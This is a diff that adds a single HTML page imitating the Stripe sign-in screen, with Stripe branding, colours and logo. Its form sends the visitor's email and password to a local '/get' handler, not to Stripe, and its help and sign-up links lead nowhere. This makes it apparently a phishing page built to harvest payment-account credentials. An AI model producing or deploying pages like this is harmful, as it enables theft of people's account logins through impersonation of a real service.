@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Stripe</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #f6f9fc;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 400px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 40px 36px;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      }
+      #logo {
+        margin-bottom: 24px;
+      }
+      .g-h1 {
+        font-size: 22px;
+        font-weight: 600;
+        color: #1a1f36;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #697386;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1px solid #e0e0e0;
+        border-radius: 6px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #635bff;
+        box-shadow: 0 0 0 3px rgba(99,91,255,0.15);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 12px;
+        background-color: #635bff;
+        color: #fff;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #5046e4;
+      }
+      .link {
+        display: block;
+        margin-top: 16px;
+        color: #635bff;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 13px;
+        color: #697386;
+        text-align: center;
+      }
+      .footer a {
+        color: #635bff;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 60 25" width="60" height="25">
+        <path fill="#635bff" d="M59.64 14.28h-8.06c.19 1.93 1.6 2.55 3.2 2.55 1.64 0 2.96-.27 4.06-.71v2.95c-1.12.56-2.78.95-4.65.95-4.29 0-7.13-2.82-7.13-7.16 0-3.88 2.71-7.18 6.73-7.18 3.84 0 6.45 2.94 6.45 7.16l.04.4zM51.58 12.53h5.89c-.1-1.57-1.27-2.73-2.95-2.73-1.71 0-2.9 1.16-2.94 2.73zM44.78 20.41V6.49l3.03-.49v14.41h-3.03zM39.39 20.41l-.24-1.68h-2.65V6.49h3.03v9.04c.67-.89 1.66-1.47 2.73-1.47 1.2 0 1.97.56 2.27 1.78h.03c.27-.47.55-.87.87-1.21v-1.2h3.02v7.79h-3.02v-9c-.27.56-.87.89-1.65.89-1.1 0-1.82-.68-2.27-1.65v5.7h-3.03zM27.63 8.46c0 1.48.5 2.4 1.52 2.4.86 0 1.6-.53 2.13-1.38l.06-.09V6.46l-3.03.49c-.03.67-.09 1.31-.09 1.95h-.59zm3.67 11.95h-3.03V11.6h3.03v8.81zM20.87 6h-3.03v14.41h3.03V6zM15.71 6h-3.03v14.41h3.03V6zM10.56 20.41l-.24-1.68H7.67V6.49h3.03v9.04c.67-.89 1.66-1.47 2.73-1.47 1.2 0 1.97.56 2.27 1.78h.03c.27-.47.55-.87.87-1.21v-1.2h3.02v7.79h-3.02v-9c-.27.56-.87.89-1.65.89-1.1 0-1.82-.68-2.27-1.65v5.7h-3.03zM0 6.49v14.41h3.03V6.49H0z"/>
+      </svg>
+      <h1 class="g-h1">Sign in to Stripe</h1>
+      <p class="g-h2">Enter your email to continue</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <a href="#" class="link">Forgot password?</a>
+      <p class="footer">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </body>
+</html>
